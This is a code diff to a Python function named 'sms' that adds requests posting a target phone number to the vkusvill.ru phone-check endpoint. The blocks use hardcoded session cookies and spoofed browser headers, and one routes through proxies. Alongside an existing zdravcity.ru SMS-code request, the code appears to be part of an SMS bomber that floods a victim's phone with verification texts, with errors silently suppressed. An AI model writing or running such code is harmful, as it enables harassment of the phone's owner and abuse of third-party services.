@@ -157,6 +157,58 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "102",
+						"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+						"cookie": 'PHPSESSID=zG2iDLORY9LIHg42dByv8lN7mmvr2jLO; BITRIX_SM_SALE_UID=106509315; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix02; uxs_uid=3fd84580-799c-11ec-9f05-b9754aa57aef; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dyandex%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dyandex%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=lMQIWd2IFG4rwMt9YhOp; mgo_cnt=1; mgo_sid=rlonr5zmqe110014onnf; WE_USE_COOKIE=Y',
+						"dnt": "1",
+						"origin": "https://vkusvill.ru",
+						"referer": "https://vkusvill.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+
+					payload = {
+						"FUSER_ID": "106509315",
+						"USER_NAME": "Вася",
+						"USER_PHONE": num2,
+						"token": "",
+						"is_retry": "N"
+					}
+					requests.post("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", data=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
 					header = {
 						"Accept": "*/*",
 						"Accept-Encoding": "gzip, deflate, br",
@@ -844,6 +896,58 @@ def sms(prx, number, tm, code):
 						"typeAction": "regUser"
 					}
 					requests.post("https://zdravcity.ru/ajax/sendcode.php", data=payload)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "102",
+						"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+						"cookie": 'PHPSESSID=zG2iDLORY9LIHg42dByv8lN7mmvr2jLO; BITRIX_SM_SALE_UID=106509315; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix02; uxs_uid=3fd84580-799c-11ec-9f05-b9754aa57aef; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dyandex%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dyandex%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=lMQIWd2IFG4rwMt9YhOp; mgo_cnt=1; mgo_sid=rlonr5zmqe110014onnf; WE_USE_COOKIE=Y',
+						"dnt": "1",
+						"origin": "https://vkusvill.ru",
+						"referer": "https://vkusvill.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+
+					payload = {
+						"FUSER_ID": "106509315",
+						"USER_NAME": "Вася",
+						"USER_PHONE": num2,
+						"token": "",
+						"is_retry": "N"
+					}
+					requests.post("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", data=payload, headers=header)
 				except:
 					pass
 
